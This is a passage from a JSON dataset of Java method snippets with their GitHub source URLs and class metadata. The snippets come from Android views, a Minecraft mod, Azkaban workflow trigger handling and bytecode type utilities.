\u6587\u5b57\u5750\u6807\uff1a (50, 100)\n        canvas.drawText(text, 50, 100, paint);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson3/Practice01DrawTextView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 30992, "method_name": "monodroidAddReference", "class_name": "TextViewHolder", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextViewHolder.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30993, "method_name": "monodroidClearReferences", "class_name": "TextViewHolder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextViewHolder.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30994, "method_name": "main", "class_name": "ComputerBuilderTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        ComputerBuilder computerActualBuilder = new ComputerActualBuilder();\n        Conductor conductor = new Conductor();\n        conductor.setComputerBuilder(computerActualBuilder);\n        Computer computer = conductor.AssembleComputer(\"Intel i7-9700K\", \"\u534e\u7855 PRIME X570-P \u4e3b\u677f\",\n                \"\u91d1\u58eb\u987f(Kingston) DDR4 2666 32GB\", \" Manli\u4e07\u4e3dGTX1660 Super 6G\u6da1\u8f6e\u7535\u7ade\u6e38\u620f\u72ec\u7acb\u663e\u5361\",\n                \"AOC 23.8\u82f1\u5bf8 AH-IPS\u786c\u5c4f 1.5mm\u7a84\u8fb9\u6846 \u4f4e\u84dd\u5149\u7231\u773c\u4e0d\u95ea\u5c4f \u7535\u8111\u663e\u793a\u5668\");\n        System.out.println(computer);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30995, "method_name": "detection", "class_name": "BaseLocalMemory", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void detection();\n}\n\n", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/common/base/BaseLocalMemory.java", "stars": "1", "class_props": {"extends": "BaseConfig", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30996, "method_name": "executeProcedure", "class_name": "RedAmaranthPotExplosionProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure RedAmaranthPotExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(RedAmaranthBlock.block, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/RedAmaranthPotExplosionProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30997, "method_name": "executeFlowAndUpdateExecID", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void executeFlowAndUpdateExecID(final TriggerInstance triggerInst) {\n    try {\n      final Project project = triggerInst.getProject();\n      final Flow flow = FlowUtils.getFlow(project, triggerInst.getFlowId());\n      final ExecutableFlow executableFlow = FlowUtils.createExecutableFlow(project, flow);\n      // execute the flow with default execution option(concurrency option being \"ignore\n      // currently running\")\n      this.executorManager.submitExecutableFlow(executableFlow, triggerInst.getSubmitUser());\n      triggerInst.setFlowExecId(executableFlow.getExecutionId());\n    } catch (final Exception ex) {\n      logger.error(\"exception when executing the associated flow and updating flow exec id for \"\n              + \"trigger instance[id: {}]\",\n          triggerInst.getId(), ex);\n      // if flow fails to be executed(e.g. running execution exceeds the allowed concurrent run\n      // limit), set associated flow exec id to Constants.FAILED_EXEC_ID. Upon web server\n      // restart, recovery process will skip those flows.\n      triggerInst.setFlowExecId(Constants.FAILED_EXEC_ID);\n    }\n\n    this.flowTriggerInstanceLoader.updateAssociatedFlowExecId(triggerInst);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30998, "method_name": "generateFailureEmailSubject", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String generateFailureEmailSubject(final TriggerInstance triggerInstance) {\n    return String.format(FAILURE_EMAIL_SUBJECT, triggerInstance.getFlowId(), triggerInstance\n        .getProjectName(), this.emailer.getAzkabanName());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30999, "method_name": "createFlowTriggerFailureEmailMessage", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "EmailMessage", "snippet": "  private EmailMessage createFlowTriggerFailureEmailMessage(final TriggerInstance triggerInst) {\n    final EmailMessage message = this.emailer.createEmailMessage(generateFailureEmailSubject\n        (triggerInst), \"text/html\", triggerInst.getFailureEmails());\n    final SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\n    message.addAllToAddress(triggerInst.getFailureEmails());\n    message.setMimeType(\"text/html\");\n    message.println(\"<table>\");\n    message.println(\"<tr><td>Start Time</td><td>\");\n    message.println(\"<tr><td>\" + sdf.format(new Date(triggerInst.getStartTime())) + \"</td><td>\");\n\n    message.println(\"<tr><td>End Time</td><td>\");\n    message.println(\"<tr><td>\" + sdf.format(new Date(triggerInst.getEndTime())) + \"</td><td>\");\n    message.println(\"<tr><td>Duration</td><td>\"\n        + Utils.formatDuration(triggerInst.getStartTime(), triggerInst.getEndTime())\n        + \"</td></tr>\");\n    message.println(\"<tr><td>Status</td><td>\" + triggerInst.getStatus() + \"</td></tr>\");\n    message.println(\"</table>\");\n    message.println(\"\");\n    final String executionUrl = this.emailer.getAzkabanURL() + \"/executor?triggerinstanceid=\"\n        + triggerInst.getId();\n\n    message.println(\"<a href=\\\"\" + executionUrl + \"\\\">\" + triggerInst.getFlowId()\n        + \" Flow Trigger Instance Link</a>\");\n\n    message.println(\"\");\n    message.println(\"<h3>Cancelled Dependencies</h3>\");\n\n    for (final DependencyInstance depInst : triggerInst.getDepInstances()) {\n      if (depInst.getStatus() == Status.CANCELLED) {\n        message.println(\"<table>\");\n        message.println(\"<tr><td>Dependency Name: \" + depInst.getDepName() + \"</td><td>\");\n        message\n            .println(\"<tr><td>Cancellation Cause: \" + depInst.getCancellationCause() + \"</td><td>\");\n        message.println(\"</table>\");\n      }\n    }\n\n    return message;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31000, "method_name": "sendFailureEmailIfConfigured", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sendFailureEmailIfConfigured(final TriggerInstance triggerInstance) {\n    final List<String> failureEmails = triggerInstance.getFailureEmails();\n    if (!failureEmails.isEmpty()) {\n      final EmailMessage message = this.createFlowTriggerFailureEmailMessage(triggerInstance);\n      this.emailer.sendEmail(message, true, \"email message failure email for flow trigger \"\n          + triggerInstance.getId());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31001, "method_name": "processSucceed", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processSucceed(final TriggerInstance triggerInst) {\n    //todo chengren311: publishing Trigger events to Azkaban Project Events page\n    this.executorService.submit(() -> executeFlowAndUpdateExecID(triggerInst));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31002, "method_name": "processTermination", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processTermination(final TriggerInstance triggerInst) {\n    //sendFailureEmailIfConfigured takes 1/3 secs\n    this.executorService.submit(() -> sendFailureEmailIfConfigured(triggerInst));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31003, "method_name": "processNewInstance", "class_name": "TriggerInstanceProcessor", "params": ["TriggerInstance"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processNewInstance(final TriggerInstance triggerInst) {\n    this.flowTriggerInstanceLoader.uploadTriggerInstance(triggerInst);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31004, "method_name": "shutdown", "class_name": "TriggerInstanceProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdown() {\n    this.executorService.shutdown();\n    this.executorService.shutdownNow();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/flowtrigger/TriggerInstanceProcessor.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31005, "method_name": "isPrimitiveDesc", "class_name": "TypeUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isPrimitiveDesc(String desc) {\n\t\tif(desc.length() != 1) {\n\t\t\treturn false;\n\t\t}\n\t\tswitch(desc.charAt(0)) {\n\t\t\tcase 'Z':\n\t\t\tcase 'C':\n\t\t\tcase 'B':\n\t\t\tcase 'S':\n\t\t\tcase 'I':\n\t\t\tcase 'F':\n\t\t\tcase 'J':\n\t\t\tcase 'D':\n\t\t\t\treturn true;\n\t\t\tdefault:\n\t\t\t\treturn false;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31006, "method_name": "commonMathType", "class_name": "TypeUtil", "params": ["Type", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "Type", "snippet": "\tpublic static Type commonMathType(Type a, Type b) {\n\t\tif (a == null || b == null)\n\t\t\tthrow new IllegalStateException(\"Cannot find common type of a null type\");\n\t\tint i1 = getPromotionIndex(a.getSort());\n\t\tint i2 = getPromotionIndex(b.getSort());\n\t\tint max = Math.max(i1, i2);\n\t\tif(max <= Type.DOUBLE)\n\t\t\treturn max == i1 ? a : b;\n\t\tthrow new IllegalStateException(\"Cannot do math on non-primitive types: \" +\n\t\t\t\ta.getDescriptor() + \" & \" + b.getDescriptor());\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31007, "method_name": "sortToSize", "class_name": "TypeUtil", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int sortToSize(int sort) {\n\t\tswitch(sort) {\n\t\t\tcase Type.LONG:\n\t\t\tcase Type.DOUBLE:\n\t\t\t\treturn 2;\n\t\t\tdefault:\n\t\t\t\treturn 1;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31008, "method_name": "getPromotionIndex", "class_name": "TypeUtil", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int getPromotionIndex(int sort) {\n\t\treturn SORT_ORDER.indexOf(sort);\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31009, "method_name": "isSubTypeOfOrNull", "class_name": "TypeUtil", "params": ["TypeChecker", "AbstractValue", "AbstractValue"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSubTypeOfOrNull(TypeChecker typeChecker, AbstractValue childValue, AbstractValue parentValue) {\n\t\treturn isSubTypeOfOrNull(typeChecker, childValue, parentValue.getType());\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31010, "method_name": "isSubTypeOfOrNull", "class_name": "TypeUtil", "params": ["TypeChecker", "AbstractValue", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSubTypeOfOrNull(TypeChecker typeChecker, AbstractValue childValue, Type parent) {\n\t\t// TODO: This should not occur\n\t\tif (childValue == null)\n\t\t\treturn false;\n\t\t// Null type and primitives do not mix.\n\t\t// Null types and object types do.\n\t\tif (childValue instanceof NullConstantValue && !isPrimitive(parent))\n\t\t\treturn true;\n\t\t// Uninitialized values are not subtypes\n\t\tif (childValue == UninitializedValue.UNINITIALIZED_VALUE)\n\t\t\treturn false;\n\t\t// Fallback\n\t\treturn isSubTypeOf(typeChecker, childValue.getType(), parent);\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31011, "method_name": "isSubTypeOf", "class_name": "TypeUtil", "params": ["TypeChecker", "Type", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSubTypeOf(TypeChecker typeChecker, Type child, Type parent) {\n\t\t// Can't handle null type\n\t\tif (child == null)\n\t\t\treturn false;\n\t\t// Simple equality check\n\t\tif (child.equals(parent))\n\t\t\treturn true;\n\t\t// Look at array element type\n\t\tboolean bothArrays = child.getSort() == Type.ARRAY && parent.getSort() == Type.ARRAY;\n\t\tif (bothArrays) {\n\t\t\t// TODO: With usage cases of \"isSubTypeOf(...)\" should we just check the element types are equals?\n\t\t\t//  - Or should sub-typing with array element types be used like it currently is?\n\t\t\tchild = child.getElementType();\n\t\t\tparent = parent.getElementType();\n\t\t\t// Dimensions must match, unless both are Object\n\t\t\tif (child.getDimensions() != parent.getDimensions() &&\n\t\t\t\t\t!(child.equals(OBJECT_TYPE) && parent.equals(OBJECT_TYPE)))\n\t\t\t\treturn false;\n\t\t}\n\t\t// Null check in case\n\t\tif (parent == null)\n\t\t\treturn false;\n\t\t// Treat lesser primitives as integers.\n\t\t//  - Because of boolean consts are ICONST_0/ICONST_1\n\t\t//  - Short parameters take the stack value of BIPUSH (int)\n\t\tif (parent.getSort() >= Type.BOOLEAN && parent.getSort() <= Type.INT)\n\t\t\tparent = Type.INT_TYPE;\n\t\t// Check for primitives\n\t\t//  - ASM sorts are in a specific order\n\t\t//  - If the expected sort is a larger type (greater sort) then the given type can\n\t\t//    be assumed to be compatible.\n\t\tif (isPrimitive(parent) && isPrimitive(child))\n\t\t\treturn parent.getSort() >= child.getSort();\n\t\t// Use a simplified check if the expected type is just \"Object\"\n\t\t//  - Most things can be lumped into an object\n\t\tif (!isPrimitive(child) && parent.getDescriptor().equals(\"Ljava/lang/Object;\"))\n\t\t\treturn true;\n\t\t// Check if types are compatible\n\t\tif (child.getSort() == parent.getSort()) {\n\t\t\tAbstractValue host = AbstractValue.ofDefault(null, typeChecker, parent);\n\t\t\treturn host != null && host.canMerge(AbstractValue.ofDefault(null, typeChecker, child));\n\t\t}\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31012, "method_name": "isPrimitive", "class_name": "TypeUtil", "params": ["Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isPrimitive(Type type) {\n\t\treturn type.getSort() < Type.ARRAY;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/util/TypeUtil.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31013, "method_name": "executeProcedure", "class_name": "PottedRedAmaranthOnBlockRightClickedProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"entity\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency entity for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure PottedRedAmaranthOnBlockRightClicked!\");\n\t\t\treturn;\n\t\t}\n\t\tEntity entity = (Entity) dependencies.get(\"entity\");\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif ((((entity instanceof LivingEntity) ? ((LivingEntity) entity).getHeldItemMainhand() : ItemStack.EMPTY)\n\t\t\t\t.getItem() == new ItemStack(Blocks.AIR, (int) (1)).getItem())) {\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.AIR.getDefaultState(), 3);\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.FLOWER_POT.getDefaultState(), 3);\n\t\t\tif (entity instanceof LivingEntity) {\n\t\t\t\tItemStack _setstack = new ItemStack(RedAmaranthBlock.block, (int) (1));\n\t\t\t\t_setstack.setCount((int) 1);\n\t\t\t\t((LivingEntity) entity).setHeldItem(Hand.MAIN_HAND, _setstack);\n\t\t\t\tif (entity instanceof ServerPlayerEntity)\n\t\t\t\t\t((ServerPlayerEntity) entity).inventory.markDirty();\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/PottedRedAmaranthOnBlockRightClickedProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 31014, "method_name": "getLayoutId", "class_name": "SoundEffectAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId(int viewType) {\n        return R.layout.item_sound_effect;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31015, "method_name": "onCreateViewHolder", "class_name": "SoundEffectAdapter", "params": ["VH", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreateViewHolder(@NotNull VH holder, int viewType) {\n\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31016, "method_name": "onBindViewHolder", "class_name": "SoundEffectAdapter", "params": ["VH", "SoundMode", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NotNull VH holder, SoundMode data, int position) {\n        holder.setText(R.id.tvText, data.getName());\n        if (position == 0) {\n            holder.setText(R.id.tvType, \"\");\n        } else {\n            holder.setText(R.id.tvType, position <= 9 ? \"\uff08\u97f3\u6548\uff09\" : \"\uff08\u53d8\u58f0\uff09\");\n        }\n\n        ImageView selected = holder.getView(R.id.ivSelected);\n        selected.setVisibility(selecteIndex == position ? View.VISIBLE : View.GONE);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31017, "method_name": "selecte", "class_name": "SoundEffectAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void selecte(int position) {\n        if (position == selecteIndex) {\n            return;\n        }\n\n        int old = this.selecteIndex;\n        this.selecteIndex = position;\n        notifyItemChanged(old);\n        notifyItemChanged(selecteIndex);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/adapter/SoundEffectAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31018, "method_name": "getSynopsis", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSynopsis() {\n        return synopsis;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31019, "method_name": "setSynopsis", "class_name": "AnimeDetails", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSynopsis(String synopsis) {\n        this.synopsis = synopsis;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31020, "method_name": "getRuntime", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRuntime() {\n        return runtime;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31021, "method_name": "setRuntime", "class_name": "AnimeDetails", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRuntime(String runtime) {\n        this.runtime = runtime;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31022, "method_name": "getStatus", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31023, "method_name": "setStatus", "class_name": "AnimeDetails", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(String status) {\n        this.status = status;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31024, "method_name": "getLastUpdated", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLastUpdated() {\n        return lastUpdated;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31025, "method_name": "setLastUpdated", "class_name": "AnimeDetails", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLastUpdated(long lastUpdated) {\n        this.lastUpdated = lastUpdated;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31026, "method_name": "getV", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getV() {\n        return v;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31027, "method_name": "setV", "class_name": "AnimeDetails", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setV(int v) {\n        this.v = v;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31028, "method_name": "getEpisodes", "class_name": "AnimeDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Episode>", "snippet": "    public List<Episode> getEpisodes() {\n        return episodes;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31029, "method_name": "setEpisodes", "class_name": "AnimeDetails", "params": ["List<Episode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEpisodes(List<Episode> episodes) {\n        this.episodes = episodes;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/anime/AnimeDetails.java", "stars": "4", "class_props": {"extends": "Anime", "implements": null, "modifiers": ["public"]}}, {"id": 31030, "method_name": "isThereJobCallbackProperty", "class_name": "JobCallbackUtil", "params": ["Props", "JobCallbackStatusEnum"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean 